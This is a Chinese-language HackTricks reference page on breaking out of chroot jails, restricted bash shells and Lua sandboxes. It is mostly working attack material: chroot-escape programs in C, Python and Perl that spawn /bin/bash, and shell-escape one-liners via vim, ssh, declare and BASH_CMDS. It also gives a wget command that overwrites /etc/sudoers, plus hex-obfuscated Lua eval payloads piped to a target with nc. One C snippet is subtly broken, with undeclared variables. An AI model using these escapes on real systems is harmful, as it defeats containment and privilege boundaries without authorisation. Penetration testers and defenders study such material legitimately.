# 逃离监狱

{% hint style="success" %}
学习并练习 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习并练习 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享黑客技巧。**

</details>
{% endhint %}

## **GTFOBins**

**在** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **中搜索是否可以使用具有“Shell”属性的任何二进制文件执行**

## Chroot 逃逸

来自 [维基百科](https://en.wikipedia.org/wiki/Chroot#Limitations): chroot 机制**并非旨在防止**特权 (**root**) **用户的故意篡改**。在大多数系统上，chroot 上下文无法正确堆叠，具有足够特权的 chroot 程序**可能执行第二个 chroot 以突破限制**。\
通常这意味着要逃逸，你需要在 chroot 中成为 root。

{% hint style="success" %}
**工具** [**chw00t**](https://github.com/earthquake/chw00t) 被创建用于滥用以下场景并从 `chroot` 中逃脱。
{% endhint %}

### Root + CWD

{% hint style="warning" %}
如果你在 chroot 中是 **root**，你可以通过创建**另一个 chroot**来逃脱。这是因为 2 个 chroot 不能共存（在 Linux 中），所以如果你创建一个文件夹，然后在该新文件夹上**创建一个新的 chroot**，你将**在其外部**，现在你将**在新的 chroot 之外**，因此你将在文件系统中。

这是因为通常 chroot **不会将你的工作目录移动到指定的目录**，因此你可以创建一个 chroot 但在其外部。
{% endhint %}

通常你不会在 chroot 监狱中找到 `chroot` 二进制文件，但你**可以编译、上传和执行**一个二进制文件：

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

{% hint style="warning" %}
这与先前的情况类似，但在这种情况下，**攻击者将文件描述符存储到当前目录**，然后**在新文件夹中创建 chroot**。最后，由于他可以在 chroot 之外访问该 **FD**，他访问它并**逃逸**。
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
文件描述符可以通过Unix域套接字传递，因此：

* 创建一个子进程（fork）
* 创建UDS以便父进程和子进程可以通信
* 在子进程中的不同文件夹中运行chroot
* 在父进程中，创建一个位于新子进程chroot之外的文件夹的文件描述符
* 使用UDS将该文件描述符传递给子进程
* 子进程切换到该文件描述符，并因为它在chroot之外，所以将逃离监狱
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* 将根设备（/）挂载到chroot内部的目录中
* 进入该目录的chroot

这在Linux中是可能的
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* 将procfs挂载到chroot内部的目录中（如果尚未挂载）
* 查找具有不同根目录/当前工作目录条目的pid，例如：/proc/1/root
* 进入该条目的chroot
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* 创建一个Fork（子进程）并chroot到文件系统中更深层次的不同文件夹并在其上CD
* 从父进程中，将子进程所在的文件夹移动到子进程chroot之前的文件夹中
* 这个子进程将发现自己在chroot之外
{% endhint %}

### ptrace

{% hint style="warning" %}
* 以前，用户可以从自身的进程中调试自己的进程... 但默认情况下不再可能
* 无论如何，如果可能的话，您可以ptrace到一个进程并在其中执行shellcode（[参见此示例](linux-capabilities.md#cap\_sys\_ptrace)）。
{% endhint %}

## Bash监狱

### 枚举

获取有关监狱的信息:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### 修改 PATH

检查是否可以修改 PATH 环境变量
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### 使用 vim
```bash
:set shell=/bin/sh
:shell
```
### 创建脚本

检查是否可以创建一个以 _/bin/bash_ 为内容的可执行文件
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### 通过SSH获取bash

如果您通过ssh访问，可以使用以下技巧执行bash shell：
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### 声明
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

您可以覆盖例如 sudoers 文件
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### 其他技巧

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**也可能对这个页面感兴趣:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python 牢笼

关于从 Python 牢笼中逃脱的技巧，请查看以下页面:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua 牢笼

在这个页面中，您可以找到 Lua 中可以访问的全局函数: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**带有命令执行的 Eval:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
一些**在不使用点号的情况下调用库函数的技巧**：
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
列举库的函数：
```bash
for k,v in pairs(string) do print(k,v) end
```
注意，每次在**不同的 Lua 环境中执行上一个单行命令时，函数的顺序会发生变化**。因此，如果您需要执行特定的函数，可以执行暴力攻击，加载不同的 Lua 环境并调用 le 库的第一个函数：
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**获取交互式lua shell**：如果你在一个受限制的lua shell中，可以调用以下命令获取一个新的lua shell（希望是无限制的）：
```bash
debug.debug()
```
## 参考

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (幻灯片: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
学习并练习 AWS 黑客技能：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习并练习 GCP 黑客技能：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
